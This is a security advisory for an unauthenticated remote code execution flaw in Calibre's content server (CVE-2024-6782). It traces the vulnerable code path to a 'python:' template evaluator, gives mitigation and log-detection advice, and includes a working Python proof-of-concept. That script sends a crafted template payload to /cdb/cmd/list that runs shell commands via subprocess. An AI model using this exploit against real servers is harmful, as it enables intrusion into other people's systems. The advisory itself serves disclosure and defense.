## Product Overview[#](#product-overview)

Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.

Calibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time

## Vulnerability Summary[#](#vulnerability-summary)

Unauthenticated remote code execution via Calibre’s content server in Calibre <= 7.14.0.

## Vulnerability Details[#](#vulnerability-details)

The source of the vulnerability is in `cmd_list.py`, that is called by the `cdb.py` router. The router imports a secondary module (in the format `cmd_*.py`) based on the incoming HTTP request’s path. In this case, a request to `/cdb/cmd/list` will result in the file `cmd_list.py` being imported and its `implementation()` function will be executed. Additionally, the request body’s content is used as `*args`.

> The list of `cmd_*.py` files can be obtained from the `src/calibre/db/cli/` directory.

```
# src/calibre/srv/cdb.py#L28
@endpoint('/cdb/cmd/{which}/{version=0}', postprocess=msgpack_or_json, methods=receive_data_methods, cache_control='no-cache')
def cdb_run(ctx, rd, which, version):
    try:
        m = module_for_cmd(which)
    except ImportError:
        raise HTTPNotFound(f'No module named: {which}')
    if not getattr(m, 'readonly', False): # [1]
        ctx.check_for_write_access(rd)
    [...snip...]
    try:
        result = m.implementation(db, partial(ctx.notify_changes, db.backend.library_path), *args) # [2]

```

The vulnerable function is located at `cmd_list.py::implementation()`, so at [1], if the `readonly` module variable is `False` or absent, the function `check_for_write_access()` would not trigger and code execution can continue. The `implementation()` function of `cmd_list.py` module is then executed with user-controlled arguments `*args` at [2].

In the `cmd_list::implementation()` function, it can be seen that user-input is used as a search string to query the library for books. Additionally, a template can also be supplied by the user to be run against the search results.

```
# src/calibre/db/cli/cmd_list.py#L15
readonly = True
[...snip...]
def implementation(
    db, notify_changes, fields, sort_by, ascending, search_text, limit, template=None
):
    [...snip...]
    if field == 'template':
        vals = {}
        global_vars = {}
        if formatter is None:
            from calibre.ebooks.metadata.book.formatter import SafeFormat
            formatter = SafeFormat()
        for book_id in book_ids:
            mi = db.get_proxy_metadata(book_id)
            vals[book_id] = formatter.safe_format(template, {}, 'TEMPLATE ERROR', mi, global_vars=global_vars)

```

The template is processed with `formatter.safe_format()`, which evaluates the user-controlled template string without any proper input sanitisation.

```
# src/calibre/utils/formatter.py#L1936
def safe_format(self, fmt, kwargs, error_value, book,
    column_name=None, template_cache=None,
    strip_results=True, template_functions=None,
    global_vars=None, break_reporter=None,
    python_context_object=None):
 state = self.save_state()
 [...snip...]
  try:
   ans = self.evaluate(fmt, [], kwargs, self.global_vars, break_reporter=break_reporter)

```

Finally, the `evaluate()` function appears to allow for arbitrary execution of any Python code if it is prefixed with `python:`.

```
# src/calibre/utils/formatter.py#L1840
def evaluate(self, fmt, args, kwargs, global_vars, break_reporter=None):
 if fmt.startswith('program:'):
  ans = self._eval_program(kwargs.get('$', None), fmt[8:],
         self.column_name, global_vars, break_reporter)
 elif fmt.startswith('python:'):
  ans = self._eval_python_template(fmt[7:], self.column_name)
 else:
  ans = self.vformat(fmt, args, kwargs)
  if self.strip_results:
   ans = self.compress_spaces.sub(' ', ans)
 if self.strip_results:
  ans = ans.strip(' ')
 return ans

```

## Exploit Conditions[#](#exploit-conditions)

This vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre’s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.

## Proof-of-Concept[#](#proof-of-concept)

We have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the remote code execution.

A sample exploit script is shown below:

```
#! /usr/bin/env python3
# PoC for: CVE-2024-6782
# Description: Unauthenticated remote code execution in calibre <= 7.14.0
# Written by: Amos Ng (@LFlare)
import json
import sys
import requests
_target = "http://localhost:8080"
def exploit(cmd):
    r = requests.post(
        f"{_target}/cdb/cmd/list",
        headers={"Content-Type": "application/json"},
        json=[
            ["template"],
            "", # sortby: leave empty
            "", # ascending: leave empty
            "", # search_text: leave empty, set to all
            1, # limit results
            f"python:def evaluate(a, b):\n import subprocess\n try:\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\n except Exception:\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()", # payload
        ],
    )
    try:
        print(list(r.json()["result"]["data"]["template"].values())[0])
    except Exception as e:
        print(r.text)
if __name__ == "__main__":
    exploit("whoami")

```
## Suggested Mitigations[#](#suggested-mitigations)

Ensure that access controls on publicly accessible endpoints are properly implemented. If code execution is allowed by design, the server should not be exposed publicly, or it should be heavily restricted to highly privileged users only.

## Detection Guidance[#](#detection-guidance)

It is possible to detect potential exploitation of the vulnerability by checking the server’s access logs for repeated POST requests to the `/cdb/cmd/list` endpoint.
